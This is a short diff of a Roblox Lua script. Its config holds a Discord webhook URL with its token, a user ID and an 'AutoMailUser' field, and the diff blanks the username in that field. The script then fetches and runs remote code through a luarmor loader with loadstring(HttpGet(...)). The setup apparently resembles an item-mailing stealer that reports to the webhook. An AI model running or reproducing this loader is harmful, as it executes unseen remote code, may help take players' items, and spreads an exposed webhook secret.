@@ -1,6 +1,6 @@
 getgenv().Config = {
     ["Webhook"] = "https://discord.com/api/webhooks/1262340733902393396/GGmUNlk76wyLKKXuDnPIXstuc-SgOgis9M7tWzu-CteLFR2zNT2xY1F242uPutt5PCf6",
     ["UserID"] = "1055547439081332786",
-    ["AutoMailUser"] = "bokirkekar067",
+    ["AutoMailUser"] = "",
 }
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/7653ba1448568b0450d2242024281829.lua"))()
